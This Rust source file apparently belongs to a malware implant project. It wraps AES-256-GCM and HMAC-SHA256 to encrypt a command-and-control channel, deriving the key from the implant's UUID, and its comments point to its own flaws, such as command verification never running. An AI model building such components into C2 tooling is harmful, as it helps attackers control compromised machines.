/*
** *********************************************************************
** *********************************************************************
**
**                              DISCLAIMER
**       For educational purposes only. 2026 All rights reversed.
**
** *********************************************************************
** *********************************************************************
*/

// aes_gcm_crypto.rs — AES-256-GCM authenticated encryption plus HMAC-SHA256.
//
// Used by c2.rs as GoldenGhost::from_seed(IMPLANT_UUID). The Worker is not
// supposed to hold this key; the operator would derive the same SHA-256(UUID)
// offline. In this tree the Worker also truncates ciphertext, so decrypt
// never happens in practice.
//
// BROKEN / UNUSED:
//   - decrypt() and verify() are never called by the implant.
//   - Comments in c2.rs claim command HMAC verification; fetch_commands
//     does not call verify().
//   - encrypt() uses expect() and will panic on AES init/encrypt failure
//     (should not happen with a 32-byte key, but there is no graceful path).

use aes_gcm::{Aes256Gcm, Nonce, aead::{Aead, KeyInit}};
use base64::{Engine, engine::general_purpose::STANDARD as B64};
use hmac::{Hmac, Mac};
use rand::{RngCore, thread_rng};
use sha2::{Sha256, Digest};

const KEY_SIZE:   usize = 32; // AES-256
const NONCE_SIZE: usize = 12; // GCM standard nonce

type HmacSha256 = Hmac<Sha256>;

/// AES-256-GCM cipher wrapper used for C2 channel encryption.
/// Name is historical; it is just a key + encrypt/decrypt/sign/verify.
pub struct GoldenGhost {
    key: [u8; KEY_SIZE],
}

impl GoldenGhost {
    /// Create a new instance with a fresh random key.
    /// NOT used by C2 (C2 derives from UUID so both sides can reconstruct).
    pub fn new() -> Self {
        let mut key = [0u8; KEY_SIZE];
        thread_rng().fill_bytes(&mut key);
        GoldenGhost { key }
    }

    /// Create from an existing 32-byte key slice.
    /// Panics if `key.len() != 32`.
    pub fn from_key(key: &[u8]) -> Self {
        assert_eq!(key.len(), KEY_SIZE, "key must be 32 bytes");
        let mut k = [0u8; KEY_SIZE];
        k.copy_from_slice(key);
        GoldenGhost { key: k }
    }

    /// Derive a key from an arbitrary seed using SHA-256 (first 32 bytes).
    /// C2 path: seed = UTF-8 implant UUID from build.rs.
    pub fn from_seed(seed: &[u8]) -> Self {
        let mut hasher = Sha256::new();
        hasher.update(seed);
        let key = hasher.finalize();
        let mut k = [0u8; KEY_SIZE];
        k.copy_from_slice(&key[..KEY_SIZE]);
        GoldenGhost { key: k }
    }

    /// Encrypt `plaintext` with a fresh random nonce.
    /// Returns `(ciphertext_b64, nonce_b64)`. Ciphertext includes the GCM tag.
    pub fn encrypt(&self, plaintext: &[u8]) -> (String, String) {
        let cipher = Aes256Gcm::new_from_slice(&self.key).expect("key init");
        let mut nonce_bytes = [0u8; NONCE_SIZE];
        thread_rng().fill_bytes(&mut nonce_bytes);
        let nonce = Nonce::from_slice(&nonce_bytes);
        let ciphertext = cipher.encrypt(nonce, plaintext).expect("encrypt");
        (B64.encode(&ciphertext), B64.encode(nonce_bytes))
    }

    /// Decrypt; returns `None` on auth failure or bad input.
    /// UNUSED on the implant (Worker never sends ciphertext back).
    pub fn decrypt(&self, ct_b64: &str, nonce_b64: &str) -> Option<Vec<u8>> {
        let ct    = B64.decode(ct_b64).ok()?;
        let nonce_raw = B64.decode(nonce_b64).ok()?;
        if nonce_raw.len() != NONCE_SIZE { return None; }
        let nonce = Nonce::from_slice(&nonce_raw);
        let cipher = Aes256Gcm::new_from_slice(&self.key).ok()?;
        cipher.decrypt(nonce, ct.as_slice()).ok()
    }

    /// HMAC-SHA256 over `msg`, base64-encoded. C2 signs *plaintext*, not ct.
    pub fn sign(&self, msg: &[u8]) -> String {
        let mut mac = HmacSha256::new_from_slice(&self.key).expect("hmac init");
        mac.update(msg);
        B64.encode(mac.finalize().into_bytes())
    }

    /// Verify a HMAC-SHA256 tag in constant time (hmac crate verify_slice).
    /// UNUSED: Worker does not send tags back; commands are plaintext JSON.
    pub fn verify(&self, msg: &[u8], tag_b64: &str) -> bool {
        let tag = match B64.decode(tag_b64) {
            Ok(t)  => t,
            Err(_) => return false,
        };
        let mut mac = HmacSha256::new_from_slice(&self.key).expect("hmac init");
        mac.update(msg);
        mac.verify_slice(&tag).is_ok()
    }

    pub fn get_key(&self) -> &[u8; KEY_SIZE] { &self.key }
}
